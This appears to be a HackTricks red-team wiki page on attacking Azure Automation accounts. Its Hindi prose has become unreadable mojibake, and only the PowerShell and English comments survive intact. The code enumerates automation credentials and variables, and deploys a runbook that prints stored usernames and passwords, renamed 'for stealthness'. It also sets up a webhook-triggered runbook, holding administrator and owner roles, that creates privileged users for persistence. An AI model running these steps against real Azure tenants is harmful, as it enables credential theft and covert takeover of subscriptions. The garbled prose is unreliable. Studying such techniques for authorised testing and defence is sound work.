# Az - рд╕реНрд╡рдЪрд╛рд▓рди рдЦрд╛рддрд╛

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг AWS рд░реЗрдб рдЯреАрдо рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг GCP рд░реЗрдб рдЯреАрдо рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕** рдФрд░ [**рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХреНрд▓рд╛рдЙрдб**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>
{% endhint %}

## рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА

[рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╕реЗ:](https://learn.microsoft.com/en-us/azure/automation/overview) рдПрдЬрд╝реНрдпреВрд░ рдСрдЯреЛрдореЗрд╢рди рдПрдХ рдХреНрд▓рд╛рдЙрдб-рдЖрдзрд╛рд░рд┐рдд рд╕реНрд╡рдЪрд╛рд▓рди, рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдЕрдкрдбреЗрдЯ рдФрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдЖрдкрдХреЗ рдПрдЬрд╝реНрдпреВрд░ рдФрд░ рдЧреИрд░-рдПрдЬрд╝реНрдпреВрд░ рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рд╕рдВрдпрдорд┐рдд рдкреНрд░рдмрдВрдзрди рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдореЗрдВ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реНрд╡рдЪрд╛рд▓рди, рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкреНрд░рдмрдВрдзрди, рдЕрдкрдбреЗрдЯ рдкреНрд░рдмрдВрдзрди, рд╕рд╛рдЭрд╛ рдХреНрд╖рдорддрд╛рдПрдБ рдФрд░ рд╡рд┐рд╡рд┐рдз рд╕реБрд╡рд┐рдзрд╛рдПрдБ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред

рдпреЗ рдПрдЬрд╝реНрдпреВрд░ рдореЗрдВ "**рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд╛рд░реНрдп**" рд╣реИрдВ рдЬреЛ рдЖрдкрдХреЛ рдЪреАрдЬреЛрдВ (рдХреНрд░рд┐рдпрд╛рдПрдБ рдпрд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рднреА) рдХреЛ **рдкреНрд░рдмрдВрдзрд┐рдд**, рдЬрд╛рдВрдЪрдиреЗ рдФрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдВрдЧреЗред

### рд░рди рдПрд╕ рдЦрд╛рддрд╛

рдЬрдм **рд░рди рдПрд╕ рдЦрд╛рддрд╛** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдПрдХ рдПрдЬрд╝реНрдпреВрд░ рдПрдбреА **рдПрдкреНрд▓рд┐рдХреЗрд╢рди** рдмрдирд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╕реНрд╡-рд╕рд╛рдЗрди рдХреА рдЧрдИ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд╣реЛрддреА рд╣реИ, рдПрдХ **рд╕реЗрд╡рд╛ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓** рдмрдирд╛рддрд╛ рд╣реИ рдФрд░ **рд╡рд░реНрддрдорд╛рди рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди** рдореЗрдВ рдЦрд╛рддреЗ рдХреЗ рд▓рд┐рдП **рдХреЙрдиреНрдЯреНрд░рд┐рдмреНрдпреВрдЯрд░** рднреВрдорд┐рдХрд╛ рдХрд╛ рдирд┐рд░реНрдзрд╛рд░рдг рдХрд░рддрд╛ рд╣реИ (рдХрдИ рдЕрдзрд┐рдХрд╛рд░)ред\
рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ **рдСрдЯреЛрдореЗрд╢рди рдЦрд╛рддреЗ** рдХреЗ рд▓рд┐рдП **рдкреНрд░рдмрдВрдзрд┐рдд рдкрд╣рдЪрд╛рди** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХрд░рддрд╛ рд╣реИред

{% hint style="warning" %}
рдпрд╣ **30 рд╕рд┐рддрдВрдмрд░, 2023 рдХреЛ рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдкрд╣рдЪрд╛рдиреЛрдВ рдХреЗ рд▓рд┐рдП рдмрджрд▓ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред**
{% endhint %}

## рд░рдирдмреБрдХреНрд╕ рдФрд░ рдиреМрдХрд░рд┐рдпрд╛рдБ

**рд░рдирдмреБрдХреНрд╕** рдЖрдкрдХреЛ **рд╡рд┐рднрд┐рдиреНрди PowerShell** рдХреЛрдб рдХреЛ **рдирд┐рд╖реЗрдзрд┐рдд** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВред рдЗрд╕реЗ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рдЙрд╕ **рд╕рдВрд▓рдЧреНрди рдкреНрд░рдзрд╛рди** рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдЪреБрд░рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
**рд░рдирдмреБрдХреНрд╕** рдХреЗ **рдХреЛрдб** рдореЗрдВ рдЖрдкрдХреЛ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА** (рдЬреИрд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓) рднреА рдорд┐рд▓ рд╕рдХрддреА рд╣реИред

рдпрджрд┐ рдЖрдк **рдиреМрдХрд░рд┐рдпрд╛рдБ** рдХреЛ **рдкрдврд╝** рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЙрдиреНрд╣реЗрдВ рдкрдврд╝реЗрдВ рдХреНрдпреЛрдВрдХрд┐ рд╡реЗ рд░рди рдХрд╛ **рдЖрдЙрдЯрдкреБрдЯ** (рд╕рдВрднрд╛рд╡рд┐рдд **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА**) рд╢рд╛рдорд┐рд▓ рдХрд░рддреА рд╣реИрдВред

`рдСрдЯреЛрдореЗрд╢рди рдЦрд╛рддреЗ` рдкрд░ рдЬрд╛рдПрдВ --> `<рдЪрдпрдирд┐рдд рдСрдЯреЛрдореЗрд╢рди рдЦрд╛рддрд╛>` --> `рд░рдирдмреБрдХреНрд╕/рдиреМрдХрд░рд┐рдпрд╛рдБ/рд╣рд╛рдЗрдмреНрд░рд┐рдб рдХрд╛рд░реНрдпрдХрд░реНрддрд╛ рд╕рдореВрд╣/рд╡реЙрдЪрд░ рдХрд╛рд░реНрдп/рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓/рдЪрд░рдг/рд╕рдВрдмрдВрдз/рд╡рд┐рджреНрдпрдорд╛рдирддрд╛рдПрдБ`

### рд╣рд╛рдЗрдмреНрд░рд┐рдб рдХрд╛рд░реНрдпрдХрд░реНрддрд╛

рдПрдХ рд░рдирдмреБрдХреНрд╕ рдХреЛ рдПрдХ **рдЖрдЬрд╝реНрдпреВрд░ рдХреЗ рднреАрддрд░ рдХрдВрдЯреЗрдирд░** рдореЗрдВ рдЪрд▓рд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдпрд╛ рдПрдХ **рд╣рд╛рдЗрдмреНрд░рд┐рдб рдХрд╛рд░реНрдпрдХрд░реНрддрд╛** (рдЧреИрд░-рдПрдЬрд╝реНрдпреВрд░ рдорд╢реАрди) рдореЗрдВред\
**рд▓реЙрдЧ рд╡рд┐рд╢реНрд▓реЗрд╖рдХ рдПрдЬреЗрдВрдЯ** рд╡реАрдПрдо рдкрд░ рдбрд┐рдкреНрд▓реЙрдп рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЗрд╕реЗ рдПрдХ рд╣рд╛рдЗрдмреНрд░рд┐рдб рдХрд╛рд░реНрдпрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдкрдВрдЬреАрдХреГрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред\
рд╣рд╛рдЗрдмреНрд░рд┐рдб рдХрд╛рд░реНрдпрдХрд░реНрддрд╛ рдЬреЙрдм рд╡рд┐рдВрдбреЛрдЬ рдкрд░ **рд╕рд┐рд╕реНрдЯрдо** рдФрд░ рд▓рд┐рдирдХреНрд╕ рдкрд░ **nxautomation** рдЦрд╛рддреЗ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рддреЗ рд╣реИрдВред\
рдкреНрд░рддреНрдпреЗрдХ рд╣рд╛рдЗрдмреНрд░рд┐рдб рдХрд╛рд░реНрдпрдХрд░реНрддрд╛ рдПрдХ **рд╣рд╛рдЗрдмреНрд░рд┐рдб рдХрд╛рд░реНрдпрдХрд░реНрддрд╛ рд╕рдореВрд╣** рдореЗрдВ рдкрдВрдЬреАрдХреГрдд рд╣реЛрддрд╛ рд╣реИред

рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдк рдПрдХ **рд╡рд┐рдВрдбреЛрдЬ рд╣рд╛рдЗрдмреНрд░рд┐рдб рдХрд╛рд░реНрдпрдХрд░реНрддрд╛** рдореЗрдВ рдПрдХ **рд░рдирдмреБрдХреНрд╕** рдЪрд▓рд╛рдиреЗ рдХрд╛ рдЪрдпрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдПрдХ рдмрд╛рд╣рд░реА рдорд╢реАрди рдореЗрдВ **рд╕рд┐рд╕реНрдЯрдо** (рдЕрдЪреНрдЫреА рдкрд┐рд╡рдЯ рддрдХрдиреАрдХ) рдХреЗ рд░реВрдк рдореЗрдВ **рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрдорд╛рдВрдб** рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВред

## рд╕рдВрдХрдЯ рд░рд╛рдЬреНрдп рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди (SC)

[рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╕реЗ:](https://learn.microsoft.com/en-us/azure/automation/automation-dsc-overview) рдПрдЬрд╝реНрдпреВрд░ рдСрдЯреЛрдореЗрд╢рди **рд░рд╛рдЬреНрдп рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди** рдПрдХ рдПрдЬрд╝реНрдпреВрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкреНрд░рдмрдВрдзрди рд╕реЗрд╡рд╛ рд╣реИ рдЬреЛ рдЖрдкрдХреЛ рдХрд┐рд╕реА рднреА рдХреНрд▓рд╛рдЙрдб рдпрд╛ рд╕реНрдерд╛рдиреАрдп рдбреЗрдЯрд╛рд╕реЗрдВрдЯрд░ рдореЗрдВ рдиреЛрдб рдХреЗ рд▓рд┐рдП PowerShell Desired State Configuration (DSC) [рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди](https://learn.microsoft.com/en-us/powershell/dsc/configurations/configurations) рд▓рд┐рдЦрдиреЗ, рдкреНрд░рдмрдВрдзрд┐рдд рдФрд░ рдХреЙрдореНрдкрд╛рдЗрд▓ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рд╕реЗрд╡рд╛ рднреА [DSC рд╕рдВрд╕рд╛рдзрди](https://learn.microsoft.com/en-us/powershell/dsc/resources/resources) рдХреЛ рдЖрдпрд╛рдд рдХрд░рддреА рд╣реИ, рдФрд░ рд▓рдХреНрд╖реНрдп рдиреЛрдбреНрд╕ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддреА рд╣реИ, рд╕рднреА рдХреНрд▓рд╛рдЙрдб рдореЗрдВред рдЖрдк рдПрдЬрд╝реНрдпреВрд░ рдкреЛрд░реНрдЯрд▓ рдореЗрдВ рдПрдЬрд╝реНрдпреВрд░ рдСрдЯреЛрдореЗрд╢рди рд╕реНрдЯреЗрдЯ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ рдЪрдпрди рдХрд░рдХреЗ **рд╕реНрдЯреЗрдЯ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди (DSC)** рдХреЗ рддрд╣рдд **рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкреНрд░рдмрдВрдзрди** рдХрд╛ рдЪрдпрди рдХрд░реЗрдВред

рдЗрди рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдореЗрдВ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА** рдорд┐рд▓ рд╕рдХрддреА рд╣реИред

### RCE

SC рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рдмрдВрдзрд┐рдд рдорд╢реАрдиреЛрдВ рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЪрд▓рд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИред

{% content-ref url="az-state-configuration-rce.md" %}
[az-state-configuration-rce.md](az-state-configuration-rce.md)
{% endcontent-ref %}

## рдЧрдгрдирд╛

{% code overflow="wrap" %}
```powershell
# Check user right for automation
az extension add --upgrade -n automation
az automation account list # if it doesn't return anything the user is not a part of an Automation group

# Gets Azure Automation accounts in a resource group
Get-AzAutomationAccount

# List & get DSC configs
Get-AzAutomationAccount | Get-AzAutomationDscConfiguration
Get-AzAutomationAccount | Get-AzAutomationDscConfiguration | where {$_.name -match '<name>'} | Export-AzAutomationDscConfiguration -OutputFolder . -Debug
## Automation Accounts named SecurityBaselineConfigurationWS... are there by default (not interesting)

# List & get Run books code
Get-AzAutomationAccount | Get-AzAutomationRunbook
Get-AzAutomationAccount | Get-AzAutomationRunbook | Export-AzAutomationRunbook -OutputFolder /tmp

# List credentials & variables & others
Get-AzAutomationAccount | Get-AzAutomationCredential
Get-AzAutomationAccount | Get-AzAutomationVariable
Get-AzAutomationAccount | Get-AzAutomationConnection
Get-AzAutomationAccount | Get-AzAutomationCertificate
Get-AzAutomationAccount | Get-AzAutomationSchedule
Get-AzAutomationAccount | Get-AzAutomationModule
Get-AzAutomationAccount | Get-AzAutomationPython3Package
## Exfiltrate credentials & variables and the other info loading them in a Runbook and printing them

# List hybrid workers
Get-AzAutomationHybridWorkerGroup -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME>
```
{% endcode %}

### рд░рдирдмреБрдХ рдмрдирд╛рдПрдВ

{% code overflow="wrap" %}
```powershell
# Get the role of a user on the Automation account
# Contributor or higher = Can create and execute Runbooks
Get-AzRoleAssignment -Scope /subscriptions/<ID>/resourceGroups/<RG-NAME>/providers/Microsoft.Automation/automationAccounts/<AUTOMATION-ACCOUNT>

# Create a Powershell Runbook
Import-AzAutomationRunbook -Name <RUNBOOK-NAME> -Path C:\Tools\username.ps1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Type PowerShell -Force -Verbose

# Publish the Runbook
Publish-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose

# Start the Runbook
Start-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -RunOn Workergroup1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose
```
{% endcode %}

### рдПрдХ рд░рди рдмреБрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдСрдЯреЛрдореЗрд╢рди рдЕрдХрд╛рдЙрдВрдЯ рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдФрд░ рдЪрд░ рдирд┐рдХрд╛рд▓реЗрдВ
```powershell
# Change the crdentials & variables names and add as many as you need
@'
$creds = Get-AutomationPSCredential -Name <credentials_name>
$runbook_variable = Get-AutomationVariable -name <variable_name>
$runbook_variable
$creds.GetNetworkCredential().username
$creds.GetNetworkCredential().password
'@ | out-file -encoding ascii 'runbook_get_creds.ps1'

$ResourceGroupName = '<resource_group_name>'
$AutomationAccountName = '<auto_acc_name>'
$RunBookName = 'Exif-Credentials' #Change this for stealthness

# Creare Run book, publish, start, and get output
New-AzAutomationRunBook -name $RunBookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Type PowerShell
Import-AzAutomationRunBook -Path 'runbook_get_creds.ps1' -Name $RunBookName -Type PowerShell -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Force
Publish-AzAutomationRunBook -Name $RunBookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName
$start = Start-AzAutomationRunBook -Name $RunBookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName
start-sleep 20
($start | Get-AzAutomationJob | Get-AzAutomationJobOutput).Summarynt
```
{% endcode %}

{% hint style="info" %}
рдЖрдк рдПрдХ рдореМрдЬреВрджрд╛ рд░рди рдмреБрдХ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рдФрд░ рд╡реЗрдм рдХрдВрд╕реЛрд▓ рд╕реЗ рднреА рдПрдХ рд╣реА рдЪреАрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
{% endhint %}

### рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЙрдЪреНрдЪ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд┐рд░реНрдорд╛рдг рд╕реЗрдЯрдЕрдк рдХреЗ рд▓рд┐рдП рдХрджрдо

#### 1. рдПрдХ рдСрдЯреЛрдореЗрд╢рди рдЕрдХрд╛рдЙрдВрдЯ рдХреА рдЖрд░рдВрднрд┐рдХрдХрд░рдг
- **рдХрд╛рд░реНрд░рд╡рд╛рдИ рдЖрд╡рд╢реНрдпрдХ:** рдПрдХ рдирдпрд╛ рдСрдЯреЛрдореЗрд╢рди рдЕрдХрд╛рдЙрдВрдЯ рдмрдирд╛рдПрдВред
- **рд╡рд┐рд╢реЗрд╖ рд╕реЗрдЯрд┐рдВрдЧ:** рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ "Create Azure Run As account" рд╕рдХреНрд╖рдо рд╣реИред

#### 2. рд░рдирдмреБрдХ рдХреЛ рдЖрдпрд╛рдд рдФрд░ рд╕реЗрдЯрдЕрдк рдХрд░реЗрдВ
- **рд╕реНрд░реЛрдд:** [MicroBurst GitHub Repository](https://github.com/NetSPI/MicroBurst) рд╕реЗ рдирдореВрдирд╛ рд░рдирдмреБрдХ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВред
- **рдХрд╛рд░реНрд░рд╡рд╛рдИ рдЖрд╡рд╢реНрдпрдХ:**
- рд░рдирдмреБрдХ рдХреЛ рдСрдЯреЛрдореЗрд╢рди рдЕрдХрд╛рдЙрдВрдЯ рдореЗрдВ рдЖрдпрд╛рдд рдХрд░реЗрдВред
- рд░рдирдмреБрдХ рдХреЛ рдкреНрд░рдХрд╛рд╢рд┐рдд рдХрд░реЗрдВ рддрд╛рдХрд┐ рдЗрд╕реЗ рдХреНрд░рд┐рдпрд╛рд╢реАрд▓ рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗред
- рд░рдирдмреБрдХ рдХреЗ рд╕рд╛рде рдПрдХ рд╡реЗрдмрд╣реБрдХ рдЬреЛрдбрд╝реЗрдВ, рдмрд╛рд╣реНрдп рдкреНрд░реЗрд░рдХреЛрдВ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдирд╛ред

#### 3. AzureAD рдореЙрдбреНрдпреВрд▓ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░реЗрдВ
- **рдХрд╛рд░реНрд░рд╡рд╛рдИ рдЖрд╡рд╢реНрдпрдХ:** AzureAD рдореЙрдбреНрдпреВрд▓ рдХреЛ рдСрдЯреЛрдореЗрд╢рди рдЕрдХрд╛рдЙрдВрдЯ рдореЗрдВ рдЬреЛрдбрд╝реЗрдВред
- **рдЕрддрд┐рд░рд┐рдХреНрдд рдХрджрдо:** рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рд╕рднреА Azure рдСрдЯреЛрдореЗрд╢рди рдореЙрдбреНрдпреВрд▓ рдЙрдирдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ рдЕрдкрдбреЗрдЯ рд╣реИрдВред

#### 4. рдЕрдиреБрдорддрд┐ рдЕрд╕рд╛рдЗрдирдореЗрдВрдЯ
- **рднреВрдорд┐рдХрд╛рдПрдБ рдЕрд╕рд╛рдЗрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:**
- рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░рд╢рд╛рд╕рдХ
- рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдорд╛рд▓рд┐рдХ
- **рд▓рдХреНрд╖реНрдп:** рдЖрд╡рд╢реНрдпрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд▓рд┐рдП рдСрдЯреЛрдореЗрд╢рди рдЕрдХрд╛рдЙрдВрдЯ рдХреЛ рдЗрди рднреВрдорд┐рдХрд╛рдУрдВ рдХреЛ рдЕрд╕рд╛рдЗрди рдХрд░реЗрдВред

#### 5. рдкрд╣реБрдВрдЪ рд╣рд╛рдирд┐ рдХреЗ рдЬрд╛рдЧрд░реВрдХрддрд╛
- **рдзреНрдпрд╛рди рджреЗрдВ:** рдзреНрдпрд╛рди рд░рдЦреЗрдВ рдХрд┐ рдРрд╕реА рд╕реНрд╡рдЪрд╛рд▓рди рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рд╕реЗ рд╕рджрд╕реНрдпрддрд╛ рдкрд░ рдирд┐рдпрдВрддреНрд░рдг рдЦреЛрдиреЗ рдХрд╛ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИред

#### 6. рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд┐рд░реНрдорд╛рдг рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдВ
- рдПрдХ рдкреЛрд╕реНрдЯ рдЕрдиреБрд░реЛрдз рднреЗрдЬрдХрд░ рдПрдХ рдирдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рд╡реЗрдмрд╣реБрдХ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдВред
- рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП PowerShell рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ, рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рдЖрдк рдЕрдкрдиреЗ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╡реЗрдмрд╣реБрдХ URL рдХреЗ рд╕рд╛рде `$uri` рдХреЛ рдмрджрд▓ рджреЗрдВ рдФрд░ `$AccountInfo` рдХреЛ рд╡рд╛рдВрдЫрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╕рд╛рде рдЕрдкрдбреЗрдЯ рдХрд░реЗрдВред
```powershell
$uri = "<YOUR_WEBHOOK_URL>"
$AccountInfo  = @(@{RequestBody=@{Username="<DESIRED_USERNAME>";Password="<DESIRED_PASSWORD>"}})
$body = ConvertTo-Json -InputObject $AccountInfo
$response = Invoke-WebRequest -Method Post -Uri $uri -Body $body
```
## рд╕рдВрджрд░реНрдн

* [https://learn.microsoft.com/en-us/azure/automation/overview](https://learn.microsoft.com/en-us/azure/automation/overview)
* [https://learn.microsoft.com/en-us/azure/automation/automation-dsc-overview](https://learn.microsoft.com/en-us/azure/automation/automation-dsc-overview)
* [https://github.com/rootsecdev/Azure-Red-Team#runbook-automation](https://github.com/rootsecdev/Azure-Red-Team#runbook-automation)

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг AWS рд░реЗрдб рдЯреАрдо рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг GCP рд░реЗрдб рдЯреАрдо рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
